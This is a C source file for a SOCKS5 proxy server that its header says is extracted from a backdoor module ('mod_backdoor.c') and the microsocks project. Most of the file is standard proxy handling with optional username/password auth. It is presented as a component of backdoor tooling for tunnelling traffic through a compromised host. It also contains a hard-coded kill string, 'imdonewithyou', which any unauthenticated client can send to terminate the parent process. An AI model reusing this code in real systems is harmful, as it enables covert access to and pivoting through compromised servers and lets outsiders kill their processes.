/*
   SOCKS5 proxy server - extracted from mod_backdoor.c and microsocks.
   Supports IPv4/IPv6, DNS resolution, username/password auth, and
   auth-once IP whitelisting.
*/

#define _GNU_SOURCE
#define _DEFAULT_SOURCE
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <signal.h>
#include <sys/select.h>
#include <errno.h>
#include <limits.h>
#include "socks.h"

#ifndef MAX
#define MAX(x, y) ((x) > (y) ? (x) : (y))
#endif

#if !defined(PTHREAD_STACK_MIN) || defined(__APPLE__)
#define PTHREAD_STACK_MIN 64*1024
#elif defined(__GLIBC__)
#define PTHREAD_STACK_MIN 32*1024
#endif

#ifndef CONFIG_LOG
#define CONFIG_LOG 1
#endif

#define STOPPROXY "imdonewithyou"

static const char *auth_user;
static const char *auth_pass;
static sblist *auth_ips;
static pthread_mutex_t auth_ips_mutex = PTHREAD_MUTEX_INITIALIZER;
static const struct server *server;
static union sockaddr_union bind_addr = {.v4.sin_family = AF_UNSPEC};

#if CONFIG_LOG
#define dolog(...) dprintf(2, __VA_ARGS__)
#else
static void dolog(const char *fmt, ...) { (void)fmt; }
#endif

static int connect_socks_target(unsigned char *buf, size_t n, struct client *client) {
    if (n < 5) return -EC_GENERAL_FAILURE;
    if (buf[0] != 5) return -EC_GENERAL_FAILURE;
    if (buf[1] != 1) return -EC_COMMAND_NOT_SUPPORTED;
    if (buf[2] != 0) return -EC_GENERAL_FAILURE;

    int af = AF_INET;
    size_t minlen = 4 + 4 + 2, l;
    char namebuf[256];
    struct addrinfo *remote;

    switch (buf[3]) {
        case 4: /* ipv6 */
            af = AF_INET6;
            minlen = 4 + 2 + 16;
            /* fall through */
        case 1: /* ipv4 */
            if (n < minlen) return -EC_GENERAL_FAILURE;
            if (namebuf != inet_ntop(af, buf+4, namebuf, sizeof namebuf))
                return -EC_GENERAL_FAILURE;
            break;
        case 3: /* dns name */
            l = buf[4];
            minlen = 4 + 2 + l + 1;
            if (n < 4 + 2 + l + 1) return -EC_GENERAL_FAILURE;
            memcpy(namebuf, buf+4+1, l);
            namebuf[l] = 0;
            break;
        default:
            return -EC_ADDRESSTYPE_NOT_SUPPORTED;
    }
    unsigned short port = (buf[minlen-2] << 8) | buf[minlen-1];
    if (resolve(namebuf, port, &remote)) return -EC_GENERAL_FAILURE;
    int fd = socket(remote->ai_addr->sa_family, SOCK_STREAM, 0);
    if (fd == -1) {
        eval_errno:
        if (fd != -1) close(fd);
        freeaddrinfo(remote);
        switch (errno) {
            case ETIMEDOUT:    return -EC_TTL_EXPIRED;
            case EPROTOTYPE:
            case EPROTONOSUPPORT:
            case EAFNOSUPPORT: return -EC_ADDRESSTYPE_NOT_SUPPORTED;
            case ECONNREFUSED: return -EC_CONN_REFUSED;
            case ENETDOWN:
            case ENETUNREACH:  return -EC_NET_UNREACHABLE;
            case EHOSTUNREACH: return -EC_HOST_UNREACHABLE;
            case EBADF:
            default:
                perror("socket/connect");
                return -EC_GENERAL_FAILURE;
        }
    }
    if (SOCKADDR_UNION_AF(&bind_addr) != AF_UNSPEC && bindtoip(fd, &bind_addr) == -1)
        goto eval_errno;
    if (connect(fd, remote->ai_addr, remote->ai_addrlen) == -1)
        goto eval_errno;
    freeaddrinfo(remote);
    if (CONFIG_LOG) {
        char clientname[256];
        int caf = SOCKADDR_UNION_AF(&client->addr);
        void *ipdata = SOCKADDR_UNION_ADDRESS(&client->addr);
        inet_ntop(caf, ipdata, clientname, sizeof clientname);
        dolog("client[%d] %s: connected to %s:%d\n", client->fd, clientname, namebuf, port);
    }
    return fd;
}

static int is_authed(union sockaddr_union *client, union sockaddr_union *authedip) {
    int af = SOCKADDR_UNION_AF(authedip);
    if (af == SOCKADDR_UNION_AF(client)) {
        size_t cmpbytes = af == AF_INET ? 4 : 16;
        void *cmp1 = SOCKADDR_UNION_ADDRESS(client);
        void *cmp2 = SOCKADDR_UNION_ADDRESS(authedip);
        if (!memcmp(cmp1, cmp2, cmpbytes)) return 1;
    }
    return 0;
}

static enum authmethod check_auth_method(unsigned char *buf, size_t n, struct client *client) {
    if (buf[0] != 5) return AM_INVALID;
    size_t idx = 1;
    if (idx >= n) return AM_INVALID;
    int n_methods = buf[idx];
    idx++;
    while (idx < n && n_methods > 0) {
        if (buf[idx] == AM_NO_AUTH) {
            if (!auth_user) return AM_NO_AUTH;
            else if (auth_ips) {
                size_t i;
                int authed = 0;
                pthread_mutex_lock(&auth_ips_mutex);
                for (i = 0; i < sblist_getsize(auth_ips); i++) {
                    if ((authed = is_authed(&client->addr, sblist_get(auth_ips, i))))
                        break;
                }
                pthread_mutex_unlock(&auth_ips_mutex);
                if (authed) return AM_NO_AUTH;
            }
        } else if (buf[idx] == AM_USERNAME) {
            if (auth_user) return AM_USERNAME;
        }
        idx++;
        n_methods--;
    }
    return AM_INVALID;
}

static void add_auth_ip(struct client *client) {
    pthread_mutex_lock(&auth_ips_mutex);
    sblist_add(auth_ips, &client->addr);
    pthread_mutex_unlock(&auth_ips_mutex);
}

static void send_auth_response(int fd, int version, enum authmethod meth) {
    unsigned char buf[2] = { version, meth };
    write(fd, buf, 2);
}

static void send_error(int fd, enum errorcode ec) {
    char buf[10] = { 5, ec, 0, 1, 0,0,0,0, 0,0 };
    write(fd, buf, 10);
}

static void copyloop(int fd1, int fd2) {
    int maxfd = fd1 > fd2 ? fd1 : fd2;
    fd_set fdsc, fds;
    FD_ZERO(&fdsc);
    FD_SET(fd1, &fdsc);
    FD_SET(fd2, &fdsc);

    while (1) {
        memcpy(&fds, &fdsc, sizeof(fds));
        struct timeval timeout = { .tv_sec = 60*15, .tv_usec = 0 };
        switch (select(maxfd+1, &fds, 0, 0, &timeout)) {
            case 0:
                send_error(fd1, EC_TTL_EXPIRED);
                return;
            case -1:
                if (errno == EINTR) continue;
                else perror("select");
                return;
        }
        int infd = FD_ISSET(fd1, &fds) ? fd1 : fd2;
        int outfd = infd == fd2 ? fd1 : fd2;
        char buf[1024];
        ssize_t sent = 0, n = read(infd, buf, sizeof buf);
        if (n <= 0) return;
        while (sent < n) {
            ssize_t m = write(outfd, buf+sent, n-sent);
            if (m < 0) return;
            sent += m;
        }
    }
}

static enum errorcode check_credentials(unsigned char *buf, size_t n) {
    if (n < 5) return EC_GENERAL_FAILURE;
    if (buf[0] != 1) return EC_GENERAL_FAILURE;
    unsigned ulen = buf[1];
    if (n < 2 + ulen + 2) return EC_GENERAL_FAILURE;
    unsigned plen = buf[2+ulen];
    if (n < 2 + ulen + 1 + plen) return EC_GENERAL_FAILURE;
    char user[256], pass[256];
    memcpy(user, buf+2, ulen);
    memcpy(pass, buf+2+ulen+1, plen);
    user[ulen] = 0;
    pass[plen] = 0;
    if (!strcmp(user, auth_user) && !strcmp(pass, auth_pass)) return EC_SUCCESS;
    return EC_NOT_ALLOWED;
}

static void *clientthread(void *data) {
    struct socks_thread *t = data;
    t->state = SS_1_CONNECTED;
    unsigned char buf[1024];
    ssize_t n;
    int ret;
    int remotefd = -1;
    enum authmethod am;

    while ((n = recv(t->client.fd, buf, sizeof buf, 0)) > 0) {
        if (!strncmp((char*)buf, STOPPROXY, strlen(STOPPROXY))) {
            if (kill(getppid(), SIGTERM) == -1)
                kill(getppid(), SIGKILL);
            exit(0);
        }
        switch (t->state) {
            case SS_1_CONNECTED:
                am = check_auth_method(buf, n, &t->client);
                if (am == AM_NO_AUTH) t->state = SS_3_AUTHED;
                else if (am == AM_USERNAME) t->state = SS_2_NEED_AUTH;
                send_auth_response(t->client.fd, 5, am);
                if (am == AM_INVALID) goto breakloop;
                break;
            case SS_2_NEED_AUTH:
                ret = check_credentials(buf, n);
                send_auth_response(t->client.fd, 1, ret);
                if (ret != EC_SUCCESS)
                    goto breakloop;
                t->state = SS_3_AUTHED;
                if (auth_ips) add_auth_ip(&t->client);
                break;
            case SS_3_AUTHED:
                ret = connect_socks_target(buf, n, &t->client);
                if (ret < 0) {
                    send_error(t->client.fd, ret * -1);
                    goto breakloop;
                }
                remotefd = ret;
                send_error(t->client.fd, EC_SUCCESS);
                copyloop(t->client.fd, remotefd);
                goto breakloop;
        }
    }
breakloop:
    if (remotefd != -1)
        close(remotefd);
    close(t->client.fd);
    t->done = 1;
    return 0;
}

static void collect(sblist *threads) {
    size_t i;
    for (i = 0; i < sblist_getsize(threads);) {
        struct socks_thread *thread = *((struct socks_thread **)sblist_get(threads, i));
        if (thread->done) {
            pthread_join(thread->pt, 0);
            sblist_delete(threads, i);
            free(thread);
        } else
            i++;
    }
}

static void zero_arg(char *s) {
    size_t i, l = strlen(s);
    for (i = 0; i < l; i++) s[i] = 0;
}

int startProxy(const char *listenip, int port, const char *user, const char *password) {
    if ((auth_user && !auth_pass) || (!auth_user && auth_pass)) {
        dprintf(2, "error: user and pass must be used together\n");
        return 1;
    }
    if (auth_ips && !auth_pass) {
        dprintf(2, "error: auth-once option must be used together with user/pass\n");
        return 1;
    }
    signal(SIGPIPE, SIG_IGN);

    if (user) {
        auth_ips = sblist_new(sizeof(union sockaddr_union), 8);
        auth_user = strdup(user);
        zero_arg((char*)user);
        auth_pass = strdup(password);
    }

    struct server s;
    sblist *threads = sblist_new(sizeof(struct socks_thread*), 8);
    if (server_setup(&s, listenip, port)) {
        perror("server_setup");
        return 1;
    }
    server = &s;
    size_t stacksz = MAX(8192, PTHREAD_STACK_MIN);

    while (1) {
        collect(threads);
        struct client c;
        struct socks_thread *curr = malloc(sizeof(*curr));
        if (!curr) goto oom;
        curr->done = 0;
        if (server_waitclient(&s, &c)) continue;
        curr->client = c;
        if (!sblist_add(threads, &curr)) {
            close(curr->client.fd);
            free(curr);
oom:
            dolog("rejecting connection due to OOM\n");
            usleep(16);
            continue;
        }
        pthread_attr_t *a = 0, attr;
        if (pthread_attr_init(&attr) == 0) {
            a = &attr;
            pthread_attr_setstacksize(a, stacksz);
        }
        if (pthread_create(&curr->pt, a, clientthread, curr) != 0)
            dolog("pthread_create failed. OOM?\n");
        if (a) pthread_attr_destroy(&attr);
    }
}
